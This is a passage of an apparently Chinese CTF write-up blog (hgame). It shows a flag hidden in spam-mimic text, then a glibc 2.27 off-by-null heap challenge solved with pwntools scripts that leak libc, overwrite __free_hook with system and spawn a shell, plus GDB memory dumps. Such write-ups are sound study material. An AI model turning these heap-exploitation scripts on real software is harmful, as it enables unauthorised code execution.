class="hljs-comment">140% plus deliver goods right to the customer&#x27;s doorstep</span><br><span class="hljs-comment">. You can begin at absolutely no cost to you . But</span><br><span class="hljs-comment">don&#x27;t believe us ! Mrs Simpson of Illinois tried us</span><br><span class="hljs-comment">and says &quot;I was skeptical but it worked for me&quot; . We</span><br><span class="hljs-comment">are licensed to operate in all states ! Because the</span><br><span class="hljs-comment">Internet operates on &quot;Internet time&quot; you must make</span><br><span class="hljs-comment">a commitment soon ! Sign up a friend and you get half</span><br><span class="hljs-comment">off ! Thank-you for your serious consideration of our</span><br><span class="hljs-comment">offer . Dear Friend ;</span> We know you are interested in<br>receiving amazing info <span class="hljs-comment">! We will comply with all removal</span><br><span class="hljs-comment">requests . This mail is being sent in compliance with</span><br><span class="hljs-comment">Senate bill 2716 , Title 5 , Section 303 ! This is</span><br><span class="hljs-comment">not a get rich scheme . Why work for somebody else</span><br><span class="hljs-comment">when you can become rich within 52 days ! Have you</span><br><span class="hljs-comment">ever noticed how many people you know are on the Internet</span><br><span class="hljs-comment">and the baby boomers are more demanding than their</span><br><span class="hljs-comment">parents ! Well, now is your chance to capitalize on</span><br><span class="hljs-comment">this . WE will help YOU decrease perceived waiting</span><br><span class="hljs-comment">time by 170% and turn your business into an E-BUSINESS</span><br><span class="hljs-comment">. You are guaranteed to succeed because we take all</span><br><span class="hljs-comment">the risk ! But don&#x27;t believe us ! Mrs Anderson who</span><br><span class="hljs-comment">resides in Alabama tried us and says &quot;Now I&#x27;m rich,</span><br><span class="hljs-comment">Rich, RICH&quot; ! We are a BBB member in good standing</span><br><span class="hljs-comment">. So make yourself rich now by ordering immediately</span><br><span class="hljs-comment">! Sign up a friend and you get half off ! Thanks .</span><br><span class="hljs-comment">Dear Salaryman ;</span> Especially for you - this red-hot<br>news <span class="hljs-comment">! We will comply with all removal requests . This</span><br><span class="hljs-comment">mail is being sent in compliance with Senate bill 1618</span><br><span class="hljs-comment">, Title 4 , Section 308 . THIS IS NOT MULTI-LEVEL MARKETING</span><br><span class="hljs-comment">. Why work for somebody else when you can become rich</span><br><span class="hljs-comment">inside 27 days ! Have you ever noticed nearly every</span><br><span class="hljs-comment">commercial on television has a .com on in it &amp; nearly</span><br><span class="hljs-comment">every commercial on television has a .com on in it</span><br><span class="hljs-comment">! Well, now is your chance to capitalize on this !</span><br><span class="hljs-comment">WE will help YOU decrease perceived waiting time by</span><br><span class="hljs-comment">180% plus turn your business into an E-BUSINESS . You</span><br><span class="hljs-comment">can begin at absolutely no cost to you ! But don&#x27;t</span><br><span class="hljs-comment">believe us ! Prof Ames who resides in Washington tried</span><br><span class="hljs-comment">us and says &quot;I was skeptical but it worked for me&quot;</span><br><span class="hljs-comment">. We assure you that we operate within all applicable</span><br><span class="hljs-comment">laws ! We implore you - act now . Sign up a friend</span><br><span class="hljs-comment">and you&#x27;ll get a discount of 10% . Thank-you for your</span><br><span class="hljs-comment">serious consideration of our offer ! Dear Friend ;</span><br>This letter was specially selected to be sent to you<br><span class="hljs-comment">! If you no longer wish to receive our publications</span><br><span class="hljs-comment">simply reply with a Subject: of &quot;REMOVE&quot; and you will</span><br><span class="hljs-comment">immediately be removed from our club ! This mail is</span><br><span class="hljs-comment">being sent in compliance with Senate bill 1622 , Title</span><br><span class="hljs-comment">7 ;</span> Section <span class="hljs-number">303</span> <span class="hljs-comment">! Do NOT confuse us with Internet scam</span><br><span class="hljs-comment">artists . Why work for somebody else when you can become</span><br><span class="hljs-comment">rich in 10 weeks ! Have you ever noticed people will</span><br><span class="hljs-comment">do almost anything to avoid mailing their bills &amp; people</span><br><span class="hljs-comment">love convenience ! Well, now is your chance to capitalize</span><br><span class="hljs-comment">on this . WE will help YOU turn your business into</span><br><span class="hljs-comment">an E-BUSINESS &amp; SELL MORE . You can begin at absolutely</span><br><span class="hljs-comment">no cost to you ! But don&#x27;t believe us . Mr Ames of</span><br><span class="hljs-comment">Louisiana tried us and says &quot;Now I&#x27;m rich, Rich, RICH&quot;</span><br><span class="hljs-comment">. We are licensed to operate in all states . We BESEECH</span><br><span class="hljs-comment">you - act now . Sign up a friend and you&#x27;ll get a discount</span><br><span class="hljs-comment">of 50% ! Thank-you for your serious consideration of</span><br><span class="hljs-comment">our offer .</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">籱籰籪籶籮粄簹籴籨粂籸籾籨籼簹籵籿籮籨籪籵簺籨籽籱簼籨籼籮籬类簼籽粆</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">hgame&#123;0k_you_s0lve_al1_th3_secr3t&#125;</span><br></code></pre></td></tr></table></figure><h2 id="weel3"><a href="#weel3" class="headerlink" title="weel3"></a>weel3</h2><h3 id="pwn-2"><a href="#pwn-2" class="headerlink" title="pwn"></a>pwn</h3><h4 id="你满了-那我就漫出来了"><a href="#你满了-那我就漫出来了" class="headerlink" title="你满了,那我就漫出来了!"></a>你满了,那我就漫出来了!</h4><ul><li><p>2.27的off_by_null(但附件应该是有什么问题 运行不了 换libc也找不到)<br>那就自己重新编译一个把 大部分都一样了</p></li><li><p>unsorttedbin是先进先出</p></li><li><pre><code class="shell">p &amp;main_arena 或 p &amp;__malloc_hook是可以的x/30gx &amp;main_arena不行<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs scss"><br>* 先是用easyheap的方法打了一下 可以泄露libc 但是double free的时候会检测到  应该需要把exp稍微调整一下<br>  也有可能是easyheap的小版本号比较低 没有检测 <span class="hljs-number">1.3</span>以后就更新了 这样的话 这种打法应该就打不通了<br><br>  &gt;现在，调用`int_free`时，将会检查整个`Tcache`链表，如果发现将要释放的`chunk`已存在于链表中将会报错`<span class="hljs-built_in">free</span>(): double free detected in tcache <span class="hljs-number">2</span>`。<br>  &gt;<br>  &gt;https://www.anquanke.com/post/id/<span class="hljs-number">219292</span>#h3-<span class="hljs-number">7</span><br><br>  ```python<br>  from pwn import *<br>  <br>  io = <span class="hljs-built_in">process</span>(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>  elf = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>  libc = elf.libc<br>  <span class="hljs-built_in">context</span>(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>  <br>  def <span class="hljs-built_in">add</span>(indx, size, content):<br>     io.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&quot;choice:&quot;</span>, b<span class="hljs-string">&#x27;1&#x27;</span>)<br>     io.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br>     io.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>     io.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&quot;Content: &quot;</span>, content)<br>  <br>  def <span class="hljs-built_in">show</span>(indx):<br>     io.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&quot;choice:&quot;</span>, b<span class="hljs-string">&#x27;2&#x27;</span>)<br>     io.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(indx))<br>  <br>  def <span class="hljs-built_in">delete</span>(indx):<br>     io.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;choice:&#x27;</span>, b<span class="hljs-string">&#x27;3&#x27;</span>)<br>     io.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br>  <br>  for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>     <span class="hljs-built_in">add</span>(i, <span class="hljs-number">0</span>xf0, b<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>  <span class="hljs-built_in">add</span>(<span class="hljs-number">10</span>, <span class="hljs-number">0</span>x10, b<span class="hljs-string">&#x27;protect&#x27;</span>)<br>  <br>  for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>     <span class="hljs-built_in">delete</span>(i)<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">9</span>)<br>  # chunk678合并<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">6</span>)<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">7</span>)<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">8</span>)<br>  <br>  for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>     <span class="hljs-built_in">add</span>(i, <span class="hljs-number">0</span>xf0, b<span class="hljs-string">&#x27;tcache&#x27;</span>)<br>  <span class="hljs-built_in">add</span>(<span class="hljs-number">7</span>, <span class="hljs-number">0</span>xf0, b<span class="hljs-string">&#x27;unsorted&#x27;</span>)  # chunk6<br>  <span class="hljs-built_in">add</span>(<span class="hljs-number">8</span>, <span class="hljs-number">0</span>xf0, b<span class="hljs-string">&#x27;unsorted&#x27;</span>)  # chunk7<br>  <span class="hljs-built_in">add</span>(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>xf0, b<span class="hljs-string">&#x27;unsorted&#x27;</span>)  # chunk8<br>  <br>  for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>     <span class="hljs-built_in">delete</span>(i)<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">8</span>)   # chunk7<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">7</span>)   # chunk6<br>  <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>xf8, b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>xf0+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x200))    # 先取tcache中的chunk7<br>  # offbynull 修改chunk8的inuse位<br>  <br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">6</span>)   # 填满tcache<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">9</span>)   # 合并<span class="hljs-number">0</span>x300 overlapping<br>  for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>     <span class="hljs-built_in">add</span>(i+<span class="hljs-number">1</span>, <span class="hljs-number">0</span>xf8, b<span class="hljs-string">&#x27;tcache&#x27;</span>)<br>  <span class="hljs-built_in">add</span>(<span class="hljs-number">8</span>, <span class="hljs-number">0</span>xf8, b<span class="hljs-string">&#x27;chunk6&#x27;</span>)<br>  <br>  <span class="hljs-built_in">show</span>(<span class="hljs-number">0</span>)<br>  unsorted = <span class="hljs-built_in">u64</span>(io.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>  base = unsorted - <span class="hljs-number">0</span>x70 - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>  <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base))<br>  ogg = [<span class="hljs-number">0</span>x4f2a5, <span class="hljs-number">0</span>x4f302, <span class="hljs-number">0</span>x10a2fc]<br>  onegadget = base + ogg[<span class="hljs-number">0</span>]<br>  <br>  <br>  <span class="hljs-built_in">add</span>(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>xf0, b<span class="hljs-string">&#x27;aa&#x27;</span>)<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">1</span>)<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">2</span>)<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">0</span>)<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">9</span>)<br>  # <span class="hljs-built_in">free</span>(): double free detected in tcache <span class="hljs-number">2</span><br>  <br>  <br>  <br>  gdb.<span class="hljs-built_in">attach</span>(io)<br>  <span class="hljs-built_in">pause</span>()<br>  <br>  io.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure></code></pre></li><li><p>一位师傅的：利用off_by_one还可以溢出 uaf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment"># io = remote(&quot;106.14.57.14&quot;, 31809)</span><br>io = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = elf.libc<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>        gdb.attach(io)<br>        pause()<br><br>sd     = <span class="hljs-keyword">lambda</span> s    : io.send(s)<br>sda    = <span class="hljs-keyword">lambda</span> s, n : io.sendafter(s, n)<br>sl     = <span class="hljs-keyword">lambda</span> s    : io.sendline(s)<br>sla    = <span class="hljs-keyword">lambda</span> s, n : io.sendlineafter(s, n)<br>rc     = <span class="hljs-keyword">lambda</span> n    : io.recv(n)<br>rl     = <span class="hljs-keyword">lambda</span>      : io.recvline()<br>rut    = <span class="hljs-keyword">lambda</span> s    : io.recvuntil(s, drop=<span class="hljs-literal">True</span>)<br>ruf    = <span class="hljs-keyword">lambda</span> s    : io.recvuntil(s, drop=<span class="hljs-literal">False</span>)<br>addr4  = <span class="hljs-keyword">lambda</span> n    : u32(io.recv(n, timeout=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>addr8  = <span class="hljs-keyword">lambda</span> n    : u64(io.recv(n, timeout=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>addr32 = <span class="hljs-keyword">lambda</span> s    : u32(io.recvuntil(s, drop=<span class="hljs-literal">True</span>, timeout=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>addr64 = <span class="hljs-keyword">lambda</span> s    : u64(io.recvuntil(s, drop=<span class="hljs-literal">True</span>, timeout=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>byte   = <span class="hljs-keyword">lambda</span> n    : <span class="hljs-built_in">str</span>(n).encode()<br>info   = <span class="hljs-keyword">lambda</span> s, n : <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[&quot;</span>+s+<span class="hljs-string">&quot; -&gt; &quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(n))+<span class="hljs-string">&quot;]\033[0m&quot;</span>)<br>sh     = <span class="hljs-keyword">lambda</span>      : io.interactive()<br>menu   = <span class="hljs-string">b&#x27;Your choice:&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, size, data</span>):<br>        sla(menu, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">b&#x27;Index: &#x27;</span>, byte(idx))<br>        sla(<span class="hljs-string">b&#x27;Size: &#x27;</span>, byte(size))<br>        sda(<span class="hljs-string">b&#x27;Content: &#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">idx</span>):<br>        sla(menu, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">b&#x27;Index: &#x27;</span>, byte(idx))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>        sla(menu, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">b&#x27;Index: &#x27;</span>, byte(idx))<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add(i, <span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;tcache&#x27;</span>)<br><br>add(<span class="hljs-number">7</span>,  <span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;A&#x27;</span>)<br>add(<span class="hljs-number">8</span>,  <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;B&#x27;</span>)<br>add(<span class="hljs-number">9</span>,  <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;B&#x27;</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;A&#x27;</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;C&#x27;</span>)  <span class="hljs-comment"># protect</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        dele(i)<br><br>dele(<span class="hljs-number">7</span>)  <span class="hljs-comment"># unsorted</span><br>dele(<span class="hljs-number">9</span>)  <span class="hljs-comment"># tcache_0x30</span><br><br><span class="hljs-comment"># 合并chunk789</span><br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0xf0</span>+<span class="hljs-number">0x10</span>+<span class="hljs-number">0x30</span>+<span class="hljs-number">0x30</span>))<br>dele(<span class="hljs-number">10</span>) <span class="hljs-comment"># overlapping</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add(i, <span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;tcache&#x27;</span>)<br><br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;A&#x27;</span>)   <span class="hljs-comment"># chunk7</span><br><br>show(<span class="hljs-number">8</span>)<br><br>libc_base = addr8(<span class="hljs-number">6</span>) - <span class="hljs-number">0x3ebca0</span><br>info(<span class="hljs-string">&quot;libc_base&quot;</span>, libc_base)<br><br>free_hook = libc_base + <span class="hljs-number">0x3ed8e8</span><br>system = libc_base + <span class="hljs-number">0x4f420</span><br><br>info(<span class="hljs-string">&quot;free_hook&quot;</span>, free_hook)<br>info(<span class="hljs-string">&quot;system&quot;</span>, system)<br><br><span class="hljs-comment"># chunk8 9 10是合并的</span><br><span class="hljs-comment"># dele(11) # tcache 不会和topchunk合并的 不删也能通</span><br>dele(<span class="hljs-number">9</span>)<br><br><span class="hljs-comment"># 从最开始chunk8开始写</span><br><span class="hljs-comment"># 溢出uaf 写入system</span><br>add(<span class="hljs-number">12</span>, <span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0x31</span>) + p64(free_hook))<br><span class="hljs-comment">#dele(12)</span><br><br>add(<span class="hljs-number">14</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">15</span>, <span class="hljs-number">0x20</span>, p64(system))<br><br>dele(<span class="hljs-number">14</span>)<br><span class="hljs-comment">#debug()</span><br>sh()<br></code></pre></td></tr></table></figure><ul><li><p>但是有个问题是89行写12 原来的unsortedbin是0x160 写了之后应该变0x120 但是是0x100（可能为了对齐？？ 但对做题没有影响</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x55cf1b802a50 <span class="hljs-comment"># unsortedbin</span></span><br>0x55cf1b802a50:0x00000000000001000x0000000000000161<br>0x55cf1b802a60:0x00007fe2b9618ca00x00007fe2b9618ca0 # main_arena<br>0x55cf1b802a70:0x00000000000000000x0000000000000000<br>0x55cf1b802a80:0x00000000000000000x0000000000000031 # 放入tcache<br>0x55cf1b802a90:0x00000000000000000x000055cf1b802010 # 指向最开始0x251的chunk(存放tcache结构体？？？)<br>0x55cf1b802aa0:0x41414141414141410x4141414141414141<br>0x55cf1b802ab0:0x00000000000001600x0000000000000100<br><br>------------------------------------------------------------------------<br>Allocated chunk | PREV_INUSE # 原chunk8 现chunk12<br>Addr: 0x55c221d28a50<br>Size: 0x41<br><br>Free chunk (unsortedbin)<br>Addr: 0x55c221d28a90<br>Size: 0x100<br>fd: 0x7ffbf434dca0<br>bk: 0x7ffbf434dca0<br><br>Allocated chunk<br>Addr: 0x55c221d28b90<br>Size: 0x00<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">x/50gx 0x55c221d28a50 <span class="hljs-comment"># unsortedbin</span></span><br>0x55c221d28a50:0x00000000000001000x0000000000000041 # 原chunk8<br>0x55c221d28a60:0x41414141414141410x4141414141414141<br>0x55c221d28a70:0x41414141414141410x4141414141414141<br>0x55c221d28a80:0x41414141414141410x0000000000000031 # 原chunk9<br>0x55c221d28a90:0x00007ffbf434f8e80x0000000000000100 # fd:free_hook 这里变成unsortedbin起始 但size0x100<br>0x55c221d28aa0:0x00007ffbf434dca00x00007ffbf434dca0 # main_arean<br>0x55c221d28ab0:0x00000000000001600x0000000000000100 # 原chunk10<br>0x55c221d28ac0:0x00000000000000410x0000000000000000<br>0x55c221d28ad0:0x00000000000000000x0000000000000000<br>0x55c221d28ae0:0x00000000000000000x0000000000000000<br>0x55c221d28af0:0x00000000000000000x0000000000000000<br>0x55c221d28b00:0x00000000000000000x0000000000000000<br>0x55c221d28b10:0x00000000000000000x0000000000000000<br>0x55c221d28b20:0x00000000000000000x0000000000000000<br>0x55c221d28b30:0x00000000000000000x0000000000000000<br>0x55c221d28b40:0x00000000000000000x0000000000000000<br>0x55c221d28b50:0x00000000000000000x0000000000000000<br>0x55c221d28b60:0x00000000000000000x0000000000000000<br>0x55c221d28b70:0x00000000000000000x0000000000000000<br>0x55c221d28b80:0x00000000000000000x0000000000000000<br>0x55c221d28b90:0x00000000000000000x0000000000000000<br>0x55c221d28ba0:0x00000000000000000x0000000000000000<br>0x55c221d28bb0:0x00000000000001200x0000000000000030<br>0x55c221d28bc0:0x00000000000000430x0000000000000000<br>0x55c221d28bd0:0x00000000000000000x0000000000000000<br></code></pre></td></tr></table></figure></li><li><p>官方题解用了fastbin 就可以double free了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = elf.libc<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span 